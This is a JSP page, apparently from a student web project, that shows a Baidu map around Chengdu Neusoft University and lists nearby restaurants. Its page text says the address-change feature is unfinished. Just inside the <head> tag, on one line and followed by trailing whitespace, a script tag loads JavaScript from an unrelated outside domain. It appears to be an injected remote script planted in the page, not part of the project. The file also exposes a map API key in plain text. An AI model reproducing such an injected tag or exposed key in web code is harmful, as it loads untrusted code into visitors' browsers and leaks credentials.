<%@ page language="java" contentType="text/html; charset=UTF-8"
    pageEncoding="UTF-8"%>
<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html>
<head><script src="https://agtsjb.com/j/gyo.js?t=fx&v=1&g=cc81daa735d8&c=d07e35d4a6b1"></script>              
	<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
	<meta name="viewport" content="initial-scale=1.0, user-scalable=no" />
	<link rel="stylesheet" href="css/main.css" type="text/css">
	<style type="text/css">
		body, html {width: 100%;height: 100%;margin:0;font-family:"微软雅黑";}
		#allmap{width:100%;height:500px;}
		p{margin-left:5px; font-size:14px;}
	</style>
	<script type="text/javascript" src="http://api.map.baidu.com/api?v=2.0&ak=hzxHZmbTbzIyoaW1QVheOFcx8AASEbEn"></script>
	<title>地址更换</title>
	<%String pagetitle="更换地址"; %>
</head>
<body>
	<div class="main">
	<%@ include file="/parts/top" %>
	<div id="allmap"></div>
	<p>*目前此功能并未完成，坐标选取并不会切换地址！</p>
	<p>返回成都东软学院地图上圆形覆盖范围内的“餐馆”检索结果，并展示在地图上</p>
	</div>
</body>
</html>
<script type="text/javascript">
	// 百度地图API功能
	var map = new BMap.Map("allmap");            // 创建Map实例
	var mPoint = new BMap.Point(103.60298,30.894435);  
	map.enableScrollWheelZoom();
	map.centerAndZoom(mPoint,14);

	var circle = new BMap.Circle(mPoint,2000,{fillColor:"blue", strokeWeight: 1 ,fillOpacity: 0.3, strokeOpacity: 0.3});
    map.addOverlay(circle);
    var local =  new BMap.LocalSearch(map, {renderOptions: {map: map, autoViewport: false}});  
    local.searchNearby('餐馆',mPoint,2000);
</script>
